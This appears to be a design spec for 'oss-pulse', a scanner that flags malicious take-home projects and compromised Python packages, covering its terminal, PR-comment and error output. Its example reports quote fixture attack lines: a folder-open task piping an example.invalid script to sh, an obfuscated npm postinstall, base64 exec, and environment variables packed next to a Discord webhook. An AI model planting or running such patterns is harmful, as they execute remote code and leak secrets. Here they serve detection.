# oss-pulse output spec

Exact layouts for everything oss-pulse prints or posts. [brand.md](brand.md) says why; this file says what. This is the target the renderer is being built toward; the current CLI does not print it yet (see ROADMAP.md). Every example uses the test-suite fixtures (the take-home in `test_scan_repository_catches_fake_interview_assignment`, the eleven packages in `check_result`), at 80 columns. The text here is the plain form, which is also what a pipe or `--color never` gets.

## 1. Rules for every surface

Streams. The report goes to stdout. Progress goes to stderr, and only when stderr is a terminal. Errors and one-line notes go to stderr.

Width. Lay everything out for 80 columns and render at `min(terminal width, 100)`; right-aligned rule IDs and labels align to that width. Below 80, sentences wrap with a hanging indent at their own column. Never wrap inside a path, a flag, a package name or a rule ID (`break_on_hyphens=False`). Code-frame lines are cut, never wrapped.

Untrusted text. Paths from a scanned folder, evidence, package names and metadata all pass through `safe_text.visible()` before they are measured, cut, underlined or printed. Compute the matched span on the escaped string, not the raw one, so `\x1b` or `\u202e` in a file shifts the underline correctly instead of breaking it. In Rich, build `Text` objects and append untrusted strings as plain segments; never print untrusted text as markup. Never emit OSC 8 hyperlinks.

Exit status, the same for scan and check, CLI and Action:

| status | when |
|---|---|
| 0 | nothing at or above `--fail-on` |
| 1 | something at or above `--fail-on` (default `hold`) |
| 2 | oss-pulse couldn't finish: bad arguments, unreadable input, PyPI unreachable, or `--strict` with something not checked or not read |

`--fail-on` takes `hold`, `review`, `watch` or `never`. For the 0.x releases the old values still work and print one line on stderr: `critical` and `high` mean `hold`, `medium` means `review`.

```text
$ oss-pulse scan . --fail-on high
note: --fail-on high now means --fail-on hold. See oss-pulse --help.
```

Numbers. Counts are computed and pluralised (`1 finding`, `2 findings`). Durations under a second get two decimals (`0.04 s`), then whole seconds (`11 s`), then `1 min 12 s`. Ages under 48 hours are hours (`36 hours old`), under 60 days are days (`5 days ago`), and from 60 days on are an ISO date (`last release 2023-10-31`). Thousands take commas (`4,024 bytes`). Sizes: `38 MB`, `3.1 kB`.

## 2. Styles

Five styles cover everything. Nothing else gets one.

| name | Rich style | SGR | applies to |
|---|---|---|---|
| `hold` | `Style(bold=True, color="red")` | `1;31` | the word hold, wherever it appears |
| `strong` | `Style(bold=True)` | `1` | review; clear in a headline or summary; group labels; `next`, `looked for`, `not read`, `not checked`; `error:` |
| `plain` | `Style()` | none | watch; paths; the file's own bytes; headline sentences; next steps |
| `dim` | `Style(dim=True)` | `2` | our own words after a path; rule IDs and labels on the right; line numbers and the `│` bar; the summary line; clear rows in a list; note; progress |
| `match` | `Style(underline=True)` | `4` | the matched bytes in a code frame |

When styles are on and when they are off:

| condition | colour | bold, dim, underline | caret line under a match |
|---|---|---|---|
| a terminal, nothing set | yes | yes | no |
| `NO_COLOR` set and not empty | no | yes | no |
| `--color never`, `TERM=dumb`, or stdout isn't a terminal | no | no | yes |
| `--color always` or `FORCE_COLOR` set | yes | yes | no |

With Rich this is `Console(no_color=True)` for the second row and `Console(color_system=None)` for the third, both measured on Rich 15: `no_color` keeps `1`, `2` and `4` and drops `31`, and `color_system=None` emits no escape codes at all.

## 3. Verdicts

Each rule has a fixed verdict, a group (when the code would run) and a grade. Add `verdict`, `runs_on`, `grade` and a `says` template to `Rule` in `supplychain/rules.py`; everything below reads them from there. Severity is unchanged.

| rule | severity | verdict | group | grade | says (after the path) |
|---|---|---|---|---|---|
| AUTO-VSCODE | critical | hold | on open | strong | runs a task when the folder opens |
| AUTO-VSCODE-SETTINGS | high | hold | on open | strong | turns on automatic tasks |
| AUTO-NPM-NET | critical | hold | on install | direct | runs hidden code during npm install; or: downloads and runs code during npm install |
| AUTO-NPM | medium | review | on install | circumstantial | has a {hook} script, which npm install runs |
| AUTO-HOOK | medium | review | on commit | circumstantial | runs before every commit; or: runs on every checkout |
| TYPO-001 | high | hold | on install | strong | has {name} ({popular}, {edit}) |
| TYPO-002 | medium | review | on install | circumstantial | has {name}, which wraps {popular} |
| CODE-PTH | high | hold | on install | strong | runs at every Python start |
| CODE-SETUP | high | hold | on install | strong | fetches a URL while pip installs it; or: runs a command while pip installs it |
| CODE-CMDCLASS | low | note | on install | circumstantial | replaces the install command (common in C extensions) |
| CODE-DLEXEC | high | hold | on run | direct | downloads a script and runs it |
| CODE-EXFIL | high | hold | on run | direct | holds a {service} URL |
| CODE-OBF | high | hold | on run | strong | runs base64-decoded code |
| CODE-JSOBF | high | hold | on run | strong | runs code it decodes first |
| CODE-SECRETS | high | hold | on run | strong | reads {what}: SSH keys, cloud credentials, browser data or wallet files |
| CODE-ENVDUMP | high | hold | on run | strong | packs os.environ into JSON; or: serialises process.env |
| CODE-CLIP | high | hold | on run | strong | reads the clipboard next to wallet addresses |
| CODE-HIDDEN | high | hold | on run | strong | is JavaScript, not a font; or: hides code after {n} spaces |
| CODE-BIN | medium | review | on run | circumstantial | is a compiled program ({kind}, {bytes}) |
| GHA-PRT | high | review | in CI | strong | checks out PR code in a pull_request_target job |
| GHA-INJECT | high | review | in CI | strong | puts {expression} into a run: script |
| GHA-CACHE-RELEASE | medium | review | in CI | circumstantial | restores a shared cache in a release job |
| GHA-UNPINNED | medium | watch | in CI | circumstantial | uses a tag, not a commit SHA |
| GHA-PERMS | low | note | in CI | circumstantial | has no permissions: block |
| EVADE-IGNORE | high or low | hold if it would hide a finding, otherwise note | scan settings | strong | asks oss-pulse to skip {n} findings; it wasn't applied |
| OSV-MAL | critical | hold | | direct | OSV lists it as malicious |
| CONF-001 | critical | hold | | direct | your internal name is on public PyPI |
| PROV-001 | high | hold | | strong | uploaded without the attestation {previous} had |
| PROV-002 | high | hold | | strong | attested from {repo}, not {linked repo} |
| OSV-VULN | high | review | | direct | {advisory} ({severity}), fixed in {version} |
| SRC-001 | medium | review | | circumstantial | links to no source repository |
| NEW-001 | medium | review | | circumstantial | first published {age} |
| REL-002 | medium | review | | circumstantial | after {n} quiet days |
| REL-003 | medium | review | | circumstantial | no v{version} tag; the newest tag is {tag} |
| OSV-RANGE | medium | watch | | direct | {version} has {advisory summary}, and {specifier} allows it |
| REL-001 | medium | watch | | circumstantial | {age} old |

Upkeep flags from `mart_dependency_risk` are not rules. They are `watch` with the label `upkeep`: archived, inactive, stale release, one maintainer (bus factor 1), slow issue response, unmerged PRs, low Scorecard, Scorecard's dangerous-workflow check. A linked repository that no longer exists, and a package that isn't on PyPI, are `review` with the label `source`. A GitHub lookup that failed is `not checked`, never a verdict. Emit `NEW-001` and `SRC-001` as findings; today the mart only produces reason strings for them.

Aggregation. A row's verdict is the worst of its findings and flags; the headline is the worst row. Verdicts never escalate by combination, so REL-001 on its own stays `watch`, and three circumstantial findings stay `review`.

Groups in scan. A finding goes in the group of its file's role first: `.vscode/` is on open; `setup.py`, `*.pth`, `package.json` hooks and build backends are on install; `.husky/`, `.githooks/` and `.git/hooks/` are on commit; `.github/workflows/` is in CI. Anything else takes the rule's group. Groups print in the order on open, on install, on commit, on run, in CI, scan settings, and a group with no findings doesn't print.

Merging. Findings in the same file whose quoted lines are within two lines of each other print as one row. The primary is the one with the higher verdict, then the stronger grade; the rest print `also matches RULE on line N` under the frame. They still count, and JSON keeps them as separate findings that point at each other.

TYPO edits. `{edit}` comes from the OSA alignment the detector already computes: `u and e swapped`, `one letter missing`, `one letter added`, `one letter changed`, `separators changed`. Never "one letter away".

## 4. scan

Grammar, with the column each part starts at:

    col 0   <verdict>  <headline>                    text starts two spaces after the word
    col n            <why>                           aligned with the headline text
    (blank)
    col 0   <group>    <group note, dim>             only "in CI" has a note
    col 2     <verdict>  <path>[:line] <says>    <RULE>   verdict field 6 wide, path at col 10,
                                                          rule right-aligned to col 80
    col 10    NN │ <evidence>                    numbers right-aligned in max(2, digits)
    col 13       │ ^^^^                          only when underline is off
    col 10    also matches RULE on line N
    (blank)
    col 0   <verdict>  N findings. N files read, nothing run. N rules, T.
    (blank)
    col 0   next
    col 2     1  <step>                          steps wrap at col 5
    (blank)
    col 0   oss-pulse rules RULE explains a rule and where it has been seen.

The path is the subject of the sentence and prints plain; `says` follows it dim. Whole-file findings (fake media, binaries) give the path without a line. When `path says` doesn't fit beside the rule ID, `says` wraps under col 10 and the rule ID stays on the first line. The evidence column starts at col 15 and gets 65 characters; a longer line is cut around the first match and marked with `…` at each cut end. Lines in one frame are dedented together.

Headline. For hold, line one says what not to do, from the groups that hold findings fall in: on open gives "Don't open this folder in VS Code", on install "don't install its dependencies", on commit "don't commit in it", on run "don't run anything in it", joined with ", and". Line two is what the strongest hold finding would do, in plain words ("Opening it runs a script from example.invalid."). For review it is "Nothing here runs on open." when that's true, then which steps run scripts and "read them before you do either". For watch: "Nothing here runs on open or install." then the fact. For clear: "No rule matched in the N files read."

Next. Only hold and review get a `next` block, and each step is an action:

| when | step |
|---|---|
| hold on open | Delete the folder, or open it only in Restricted Mode: when VS Code asks whether you trust the authors, choose "No, I don't trust the authors". Tasks don't run in Restricted Mode. |
| hold on install, nothing on open | Don't run npm install or pip install here. To read the code, open the folder in Restricted Mode. |
| any hold on open, install or run | If you already trusted it in VS Code or ran an install in it, assume the script ran. Disconnect this machine from the network. From another device, change the passwords saved in its browsers, sign out of its sessions, replace its GitHub, npm, cloud and SSH keys, and move any crypto to a new wallet. |
| any hold | If a recruiter sent this, report the posting where you found it and tell the company it names; it may not know its name is being used. |
| review | Read {path:line, path} before you {install, commit, run} |
| CODE-BIN | Don't run {path} unless you know where it came from. oss-pulse can't read compiled programs. |

The step text is fixed. Don't add "less" or any pager: `less` with `LESSOPEN` has run commands from crafted file names (CVE-2024-32487), and the reader here is exactly who that hurts.

### hold: a take-home that runs code on open

Styles on a terminal: `hold` bold red everywhere it appears; `on open`, `on install`, `on run`, `in CI` and `next` bold; paths and quoted bytes plain; every `says` phrase, rule ID, line number, `│`, `also matches`, the group note, the summary after `hold`, the step numbers and the last line dim; underlined: `curl -s https://example.invalid/a | sh`, `"runOn": "folderOpen"`, `"task.allowAutomaticTasks": "on"`, `eval(atob('x'))`, `reqeusts`, `require('child_process')`, `@v2`. Exit 1.

```text
$ oss-pulse scan take-home

hold  Don't open this folder in VS Code, and don't install its dependencies.
      Opening it runs a script from example.invalid.

on open
  hold    .vscode/tasks.json:8 runs a task when the folder opens     AUTO-VSCODE
           7 │ "command": "curl -s https://example.invalid/a | sh",
             │             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
           8 │ "runOptions": { "runOn": "folderOpen" }
             │                 ^^^^^^^^^^^^^^^^^^^^^
          also matches CODE-DLEXEC on line 7
  hold    .vscode/settings.json:1 turns on automatic tasks  AUTO-VSCODE-SETTINGS
           1 │ {"task.allowAutomaticTasks": "on"}
             │  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
on install
  hold    package.json:3 runs hidden code during npm install        AUTO-NPM-NET
           3 │ … "postinstall": "node -e \"eval(atob('x'))\"", "test": "jest" }
             │                             ^^^^^^^^^^^^^^^
  hold    requirements.txt:1 has reqeusts (requests, u and e swapped)   TYPO-001
           1 │ reqeusts==1.0
             │ ^^^^^^^^
on run
  hold    public/font.woff2 is JavaScript, not a font                CODE-HIDDEN
           1 │ const s = require('child_process'); s.exec(x)
             │           ^^^^^^^^^^^^^^^^^^^^^^^^
in CI    runs where the workflows run, with that runner's token
  watch   .github/workflows/ci.yml:8 uses a tag, not a commit SHA   GHA-UNPINNED
           8 │ - uses: some-org/setup-thing@v2
             │                             ^^^
  note    .github/workflows/ci.yml has no permissions: block           GHA-PERMS

hold  8 findings. 7 files read, nothing run. 25 rules, 0.04 s.

next
  1  Delete the folder, or open it only in Restricted Mode: when VS Code asks
     whether you trust the authors, choose "No, I don't trust the authors".
     Tasks don't run in Restricted Mode.
  2  If you already trusted it in VS Code or ran an install in it, assume the
     script ran. Disconnect this machine from the network. From another device,
     change the passwords saved in its browsers, sign out of its sessions,
     replace its GitHub, npm, cloud and SSH keys, and move any crypto to a new
     wallet.
  3  If a recruiter sent this, report the posting where you found it and tell
     the company it names; it may not know its name is being used.

oss-pulse rules AUTO-VSCODE explains a rule and where it has been seen.
```

### review: needs a person to read three places

`review` is bold, `watch` plain. Exit 0 with the default `--fail-on hold`.

```text
$ oss-pulse scan cli-starter

review  Nothing here runs on open. npm install and git commit both run
        scripts from this folder; read them before you do either.

on install
  review  package.json:5 has a prepare script, which npm install runs   AUTO-NPM
           5 │ "prepare": "husky",
             │ ^^^^^^^^^
on commit
  review  .husky/pre-commit runs before every commit                   AUTO-HOOK
           2 │ npx lint-staged
on run
  review  tools/fmt is a compiled program (ELF, 4,024 bytes)            CODE-BIN
in CI    runs where the workflows run, with that runner's token
  watch   .github/workflows/ci.yml:10 uses a tag, not a commit SHA  GHA-UNPINNED
          10 │ - uses: pnpm/action-setup@v4
             │                          ^^^

review  4 findings. 5 files read, nothing run. 25 rules, 0.04 s.

next
  1  Read package.json:5 and .husky/pre-commit before you install or commit.
  2  Don't run tools/fmt unless you know where it came from. oss-pulse can't
     read compiled programs.
```

### clear: nothing matched

`clear` bold in the headline and the summary line. `looked for` lists every check with where it looked and what it found. `not read` appears whenever anything was skipped: files over 5 MB, skipped folders that exist (`.git/`, `node_modules/`, `.venv/`), and, if the 50,000-file limit stopped the walk, the line `stopped after 50,000 files; the rest weren't read` with `(incomplete)` after the verdict word.

```text
$ oss-pulse scan invoice-parser

clear  No rule matched in the 13 files read.

looked for
  runs on open     .vscode/                   no .vscode/ folder
  runs on install  setup.py, .pth, npm hooks  none in this folder
  runs on commit   .git/hooks/, .husky/       only git's .sample hooks
  hidden code      13 files                   nothing disguised or obfuscated
  lookalike names  pyproject.toml             httpx, rich, typer: no lookalikes
  in CI            .github/workflows/         2 actions, both pinned to a SHA

note    .github/workflows/ci.yml has no permissions: block             GHA-PERMS

not read
  data/cities.json   38 MB, over the 5 MB limit
  .git/              apart from hooks; git's own config isn't checked

clear  13 of 14 files read, nothing run. 25 rules, 0.01 s.
       clear means no rule matched. It isn't an audit, and it can't see
       what the code downloads after it starts.
```

### -q and -v

`-q` prints the headline's first line and nothing else; the exit status is unchanged.

```text
$ oss-pulse scan take-home -q
hold  Don't open this folder in VS Code, and don't install its dependencies.
```

`-v` adds, under each finding, its severity, grade and "seen in", prints merged findings as their own rows, and drops the 65-character cut.

```text
$ oss-pulse scan take-home -v
  (the default view, plus for every finding:)
  hold    .vscode/tasks.json:8 runs a task when the folder opens     AUTO-VSCODE
          critical, strong evidence. Contagious Interview (2023).
           7 │ "command": "curl -s https://example.invalid/a | sh",
             │             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
           8 │ "runOptions": { "runOn": "folderOpen" }
             │                 ^^^^^^^^^^^^^^^^^^^^^
  hold    .vscode/tasks.json:7 downloads a script and runs it        CODE-DLEXEC
          high, direct evidence.
```

## 5. check

Grammar:

    col 0   <verdict>  <headline>
    col n            <why, one or two lines>
    (blank)
    col 0   <verdict>  <name version>  <reason>             <RULE or label>
    col 28                             <supporting fact, dim>  <RULE>
    (blank)
    col 0   in <release file>, sha256 verified              only for packages at hold with code findings
    col 2     <path:line> <says>                            <RULE>
    col 2     NN │ <evidence>
    (blank)
    col 0   [not checked  <source>: <reason>]
    (blank)
    col 0   <verdict>  N dependencies and N release files read, nothing installed. T.
    (blank)
    col 0   next
    col 2     1  <step>

Columns: the verdict field is 6 wide plus 2, so names start at col 8. The name field is the longest `name version` (at most 20) plus 2, so reasons start at col 28 here. Rule IDs or labels (`upkeep`, `source`) are right-aligned to col 80. A package gets one reason line and at most three dim supporting lines, each with its own rule ID; `-v` prints all of them. Clear rows print entirely dim. Rows sort by verdict, then grade (direct, strong, circumstantial, then upkeep and source), then the line the package is declared on.

Headline: "Don't install {names}." for hold, then the one or two strongest reasons in plain words. For review, "Read {n} packages before you install them." For watch, "Nothing here needs action before you install." For clear, "No rule matched for the N dependencies in {file}."

Next steps, one per hold or review package, in row order. The first mention of the file says `requirements.txt:3`; later ones say `(line 6)`:

| finding | step |
|---|---|
| OSV-MAL | Remove {pkg} ({file:line}). Treat any machine that installed it as exposed. |
| CONF-001 | Install {pkg} from your own index only: --index-url, not --extra-index-url, or pip takes the higher version from pypi.org. |
| PROV-*, REL-002/003, CODE-* | Pin {pkg}=={previous} (line N), and tell its maintainers privately; they may not know yet. |
| TYPO-001 | Replace {name} with {popular} (line N). |
| OSV-VULN | Upgrade {pkg} to {fixed} (line N). |
| source | If {pkgs} are your own packages, pass --internal for each. If not, find out where they come from before you install them. |
| not checked: rate limit | export GITHUB_TOKEN=$(gh auth token), then run it again. |

### hold: the test-suite scenario

`hold` bold red; `review` bold; `watch` plain; the `clear` row and every supporting line dim; reasons plain; rule IDs and labels dim; `in hijacked_lib-3.0.tar.gz` bold. Exit 1.

```text
$ oss-pulse check requirements.txt

hold  Don't install evil-lib, corp-utils, hijacked-lib 3.0 or reqeusts.
      OSV lists evil-lib as malicious, and hijacked-lib 3.0 collects
      os.environ in a file that also holds a Discord webhook URL.

hold    evil-lib 0.2        OSV lists it as malicious                    OSV-MAL
hold    corp-utils          your internal name is on public PyPI        CONF-001
                            pypi.org has corp-utils 9.9.9, uploaded 3 days ago
hold    hijacked-lib 3.0    uploaded without the attestation 2.9 had    PROV-001
                            2 days old, after 500 quiet days     REL-001 REL-002
                            no v3.0 tag; the newest tag is v2.9          REL-003
hold    reqeusts 0.0.1      requests with u and e swapped               TYPO-001
                            first published 5 days ago; no source repo   NEW-001
review  vuln-lib 1.0.0      GHSA-aaaa-bbbb-cccc (high), fixed in 1.0.1  OSV-VULN
review  ghost-lib 1.1       links to gone/ghost-lib, which doesn't exist  source
review  does-not-exist-lib  not on PyPI, so anyone can claim it           source
watch   range-lib 2.0       1.0 has an XSS bug, and >=1.0 allows it    OSV-RANGE
watch   abandoned-lib 1.0   archived; last release 2023-10-31             upkeep
watch   solo-lib 0.6        one person makes half or more of the commits  upkeep
                            OpenSSF Scorecard 3.0/10; flags a dangerous workflow
clear   healthy-lib 1.5.0   attested

in hijacked_lib-3.0.tar.gz, sha256 verified
  setup.py:2 fetches a URL while pip installs it                      CODE-SETUP
   2 │ urllib.request.urlopen('https://example.invalid/stage2')
     │ ^^^^^^^^^^^^^^^^^^^^^^
  hijacked_lib.pth:1 runs at every Python start                         CODE-PTH
   1 │ import os; os.getpid()
     │ ^^^^^^^^^
  hijacked_lib/__init__.py:2 runs base64-decoded code on import         CODE-OBF
   2 │ exec(base64.b64decode('cHJpbnQoMSk='))
     │ ^^^^^^^^^^^^^^^^^^^^^^
  hijacked_lib/stats.py:2 packs os.environ into JSON                CODE-ENVDUMP
   2 │ payload = json.dumps(dict(os.environ))
     │                      ^^^^^^^^^^^^^^^^
   3 │ HOOK = 'https://discord.com/api/webhooks/000/xxx'
     │         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  also matches CODE-EXFIL on line 3

hold  11 dependencies and 9 release files read, nothing installed. 11 s.

next
  1  Remove evil-lib (requirements.txt:3). Treat any machine that installed it
     as exposed.
  2  Install corp-utils from your own index only: --index-url, not
     --extra-index-url, or pip takes the higher version from pypi.org.
  3  Pin hijacked-lib==2.9 (line 6), and tell its maintainers privately; they
     may not know yet.
  4  Replace reqeusts with requests (line 7).
  5  Upgrade vuln-lib to 1.0.1 (line 4).
  6  If ghost-lib and does-not-exist-lib are your own packages, pass --internal
     for each. If not, find out where they come from before you install them.
```

### clear

```text
$ oss-pulse check requirements.txt

clear  No rule matched for the 4 dependencies in requirements.txt.

clear   healthy-lib 1.5.0   attested
clear   plain-lib 0.9.0
clear   quiet-lib 3.2.1     attested
clear   tidy-lib 2.3.1

clear  4 dependencies and 4 release files read, nothing installed. 6 s.
       clear means no rule matched. It isn't an audit.
```

### not checked, with --strict

`not checked` is bold and sits above the summary line. Without `--strict` the report ends at the summary and exits by verdict; with it, the error follows and the exit status is 2.

```text
$ oss-pulse check requirements.txt --strict

  (report as above)

not checked  upkeep for 4 of 9 repositories: GitHub stopped answering
             after 60 requests. It resets at 22:14 UTC.

hold  11 dependencies and 9 release files read, nothing installed. 9 s.

error: 1 source wasn't checked, and --strict fails when that happens

  Without a token GitHub allows 60 requests an hour; with one, 5,000.
  What was fetched so far is cached, so the next run asks only for the rest:

    export GITHUB_TOKEN=$(gh auth token)
    oss-pulse check requirements.txt --strict
```

## 6. Errors

    error: <what happened>          bold "error:", then plain text, lowercase, no full stop
    (blank)
      <why, one or two sentences>   indented 2
    (blank)
        <command to type>           indented 4, one per line

stderr, exit 2. No traceback unless `-v` or `OSS_PULSE_DEBUG=1`. No Rich panel. Click's usage errors are caught and reworded in the same shape (section 11 shows how).

| case | first line |
|---|---|
| lockfile (uv.lock, poetry.lock, Pipfile.lock) | can't check uv.lock: lockfiles aren't supported yet |
| package.json, Cargo.toml, go.mod | can't check package.json: npm isn't covered yet |
| scan given a .zip, .tar.gz or .tgz | take-home.zip is a zip file, and scan reads folders |
| scan given another file | {path} is a file, and scan reads folders |
| check given a folder | {path} is a folder; check reads one dependency file |
| path doesn't exist | there is no folder at {path} (or: no file at {path}) |
| no dependencies, or dynamic ones | no dependencies found in {file} |
| PyPI unreachable | can't reach pypi.org, so nothing was checked |
| bad `--fail-on` | --fail-on takes hold, review, watch or never, not {value} |
| unknown option | no such option: {option} (then: oss-pulse {command} --help lists them) |
| dbt build failed | the report couldn't be built: dbt build failed (then: run it again with -v to see dbt's output) |

```text
$ oss-pulse check uv.lock
error: can't check uv.lock: lockfiles aren't supported yet

  oss-pulse reads pyproject.toml and requirements*.txt. To check everything
  uv.lock pins, transitive dependencies included, export it first:

    uv export -o requirements-lock.txt
    oss-pulse check requirements-lock.txt

$ oss-pulse check package.json
error: can't check package.json: npm isn't covered yet

  check reads Python dependency files. To look for install hooks and hidden
  code in this project instead, scan the folder:

    oss-pulse scan .

$ oss-pulse scan ~/Downloads/take-home.zip
error: take-home.zip is a zip file, and scan reads folders

  Unzip it first. Unzipping writes the files; it doesn't run them.

    unzip -q ~/Downloads/take-home.zip -d ~/take-home
    oss-pulse scan ~/take-home

$ oss-pulse check pyproject.toml
error: no dependencies found in pyproject.toml

  [project] lists dependencies as dynamic, so they live in another file.
  Check that file instead:

    oss-pulse check requirements.txt

$ oss-pulse scan ./take-hom
error: there is no folder at ./take-hom

$ oss-pulse check requirements.txt
error: can't reach pypi.org, so nothing was checked

  check needs PyPI for every package; GitHub, OSV and Scorecard are optional.
  The connection failed with: [Errno -3] Temporary failure in name resolution
```

## 7. Progress

Only on a terminal, only on stderr, and only once a step has taken 0.3 s. One dim line, rewritten in place (`\r`, then clear to the end of the line) and erased before the report prints. No spinner, no bar, no percentage. With `-v` the line is replaced by the existing timestamped log lines; without `-v` those INFO lines don't print at all.

```text
checking 11 dependencies: PyPI 7 of 11
checking 11 dependencies: release files 6 of 9, hijacked_lib-3.0.tar.gz
checking 11 dependencies: OSV
checking 11 dependencies: GitHub 4 of 9 repositories
checking 11 dependencies: building the report
```

scan prints `reading take-home: 1,204 files` the same way, and only when the walk passes half a second.

## 8. Help and rules

Hand-written, not generated by Typer's Rich formatter. User commands come first; the lakehouse commands move to a footnote.

```text
$ oss-pulse --help
oss-pulse 0.1.0: triage for code you didn't write

Reads a folder, or the packages a project depends on, without running any
of it. Every finding quotes the line it rests on.

commands
  scan [PATH]    read a folder before you open it
  check [FILE]   check the packages in pyproject.toml or requirements*.txt
  rules [RULE]   what each rule matches, and where it has been seen

options for scan and check
  --fail-on VERDICT    exit 1 at hold, review or watch (default hold)
  --json FILE          also write the report as JSON
  --markdown FILE      also write it as Markdown, as posted on a PR
  --sarif FILE         also write SARIF, for GitHub code scanning
  --color WHEN         auto, always or never; NO_COLOR works too
  -v, --verbose        every finding, with its severity and evidence grade
  -q, --quiet          print the verdict line only

exit status: 0 below --fail-on, 1 at or above it, 2 if oss-pulse couldn't
finish. Set GITHUB_TOKEN to raise GitHub's limit from 60 to 5,000 requests
an hour.

The lakehouse commands (demo, ingest, synthetic, transform, report) are
described in docs/lakehouse.md.
```

```text
$ oss-pulse scan --help
oss-pulse scan [PATH]

Reads PATH (default: this folder) as bytes and runs nothing in it. What it
finds is grouped by when that code would run: on open, on install, on
commit, on run, in CI. scan exits 1 on hold, so this doesn't open a folder
that a hold rule matched:

  oss-pulse scan ~/take-home && code ~/take-home

It's a check before you open, not a reason to trust the folder. VS Code's
Restricted Mode is still how to open code from strangers.

options
  --ignore-file FILE   paths or rule IDs you have reviewed, one per line. A
                       file inside PATH is reported, never applied.
  --fail-on VERDICT    hold, review, watch or never (default hold)
  --json FILE, --markdown FILE, --sarif FILE, --color WHEN, -v, -q
                       as in oss-pulse --help
```

`oss-pulse rules` lists every rule on one line: ID, verdict, group, what it matches. `oss-pulse rules RULE` explains one. Both read from `rules.py`, so the counts can't go stale.

```text
$ oss-pulse rules
AUTO-VSCODE          hold    on open     a task runs when the folder opens
AUTO-VSCODE-SETTINGS hold    on open     the folder turns on automatic tasks
AUTO-NPM-NET         hold    on install  an npm hook fetches or runs code
AUTO-NPM             review  on install  an npm install hook runs a script
AUTO-HOOK            review  on commit   git hooks ship with the folder
... 31 more. oss-pulse rules RULE-ID explains one.
```

```text
$ oss-pulse rules AUTO-VSCODE
AUTO-VSCODE  hold, on open  (critical, strong evidence)

A VS Code task with "runOn": "folderOpen" runs its command as soon as the
folder is opened in a trusted window. In Restricted Mode, tasks don't run.

matches  .vscode/tasks.json: any task whose runOptions.runOn is
         folderOpen
seen in  Contagious Interview, fake job interviews (named in 2023)
docs     docs/RULES.md#auto-vscode
```

## 9. Markdown: PR comment, job summary, annotations

GitHub's styles only: no emoji, no alerts, no colour, no images, no badges. One comment, found by the `<!-- oss-pulse-report -->` marker and edited in place on every push. The marker is never printed to the terminal.

Structure:

1. `### {Verdict}: {answer}`, the one place a verdict word is capitalised, because it starts a heading. The answer is a sentence: "don't merge until N dependencies are dealt with", "read N things before merging", "nothing blocks this merge; N facts worth knowing", "no rule matched in N dependencies or the repository".
2. One plain sentence naming what's on hold, and what the repository scan found.
3. A fenced `text` block with the package rows exactly as in the terminal, without supporting lines. The fence is one backtick longer than the longest run of backticks inside it, and everything inside has been through `visible()`.
4. `#### Before you merge`: the next steps as a numbered list, each linking the line at the commit (`https://github.com/{repo}/blob/{sha}/{file}#L{line}`) and the advisory (`https://osv.dev/vulnerability/{id}`).
5. One sentence for upkeep, naming the packages: "abandoned-lib and solo-lib are upkeep facts, not signs of tampering."
6. `Not checked: …` as a normal paragraph, when anything wasn't, with the reason and the fix.
7. Folds: `What matched in {pkg} {version}` with the release-file evidence and its caret lines, and `Repository scan: …` with the scan rows.
8. A `<sub>` footer: version, commit, time, what was read, "nothing installed or run", and a link to how verdicts are decided. When a third-party release is on hold or review, add: "A finding is about a release, never about the people who maintain it."

Never tell the PR author how to ignore a finding. A PR can edit `.osspulseignore`; the README and docs/github-action.md explain the ignore file and that it must be covered by CODEOWNERS.

When the body would pass GitHub's 65,536-character limit, drop the folds first and say so in place: "The evidence for 3 packages is in the job summary; this comment hit GitHub's size limit."

### hold

````markdown
<!-- oss-pulse-report -->
### Hold: don't merge until 4 dependencies are dealt with

`evil-lib`, `corp-utils`, `hijacked-lib` 3.0 and `reqeusts` are on hold. Nothing in the repository itself runs on open or install.

```text
hold    evil-lib 0.2        OSV lists it as malicious                    OSV-MAL
hold    corp-utils          your internal name is on public PyPI        CONF-001
hold    hijacked-lib 3.0    uploaded without the attestation 2.9 had    PROV-001
hold    reqeusts 0.0.1      requests with u and e swapped               TYPO-001
review  vuln-lib 1.0.0      GHSA-aaaa-bbbb-cccc (high), fixed in 1.0.1  OSV-VULN
review  ghost-lib 1.1       links to gone/ghost-lib, which doesn't exist  source
review  does-not-exist-lib  not on PyPI, so anyone can claim it           source
watch   range-lib 2.0       1.0 has an XSS bug, and >=1.0 allows it    OSV-RANGE
watch   abandoned-lib 1.0   archived; last release 2023-10-31             upkeep
watch   solo-lib 0.6        one person makes half or more of the commits  upkeep
clear   healthy-lib 1.5.0   attested
```

#### Before you merge

1. Remove `evil-lib` from [requirements.txt line 3](https://github.com/acme/weather-api/blob/4f2a9c1/requirements.txt#L3). OSV lists it as malicious ([MAL-2026-0001](https://osv.dev/vulnerability/MAL-2026-0001)); treat any machine that installed it as exposed.
2. Install `corp-utils` from your own index only: `--index-url`, not `--extra-index-url`. pypi.org has a `corp-utils` 9.9.9 uploaded 3 days ago, and pip takes the higher version.
3. Pin `hijacked-lib==2.9` on [line 6](https://github.com/acme/weather-api/blob/4f2a9c1/requirements.txt#L6). 3.0 came 2 days ago, after 500 quiet days, without the attestation 2.9 had, and its sdist fetches a URL while pip installs it. Tell the maintainers privately; they may not know yet.
4. Replace `reqeusts` with `requests` on [line 7](https://github.com/acme/weather-api/blob/4f2a9c1/requirements.txt#L7).
5. Upgrade `vuln-lib` to 1.0.1 on [line 4](https://github.com/acme/weather-api/blob/4f2a9c1/requirements.txt#L4) ([GHSA-aaaa-bbbb-cccc](https://osv.dev/vulnerability/GHSA-aaaa-bbbb-cccc), high).

`abandoned-lib` and `solo-lib` are upkeep facts, not signs of tampering. If `ghost-lib` and `does-not-exist-lib` are your own packages, add them to `internal-packages`.

<details><summary>What matched in hijacked-lib 3.0</summary>

```text
in hijacked_lib-3.0.tar.gz, sha256 verified
  setup.py:2 fetches a URL while pip installs it                      CODE-SETUP
   2 │ urllib.request.urlopen('https://example.invalid/stage2')
     │ ^^^^^^^^^^^^^^^^^^^^^^
  hijacked_lib.pth:1 runs at every Python start                         CODE-PTH
   1 │ import os; os.getpid()
     │ ^^^^^^^^^
  hijacked_lib/__init__.py:2 runs base64-decoded code on import         CODE-OBF
   2 │ exec(base64.b64decode('cHJpbnQoMSk='))
     │ ^^^^^^^^^^^^^^^^^^^^^^
  hijacked_lib/stats.py:2 packs os.environ into JSON                CODE-ENVDUMP
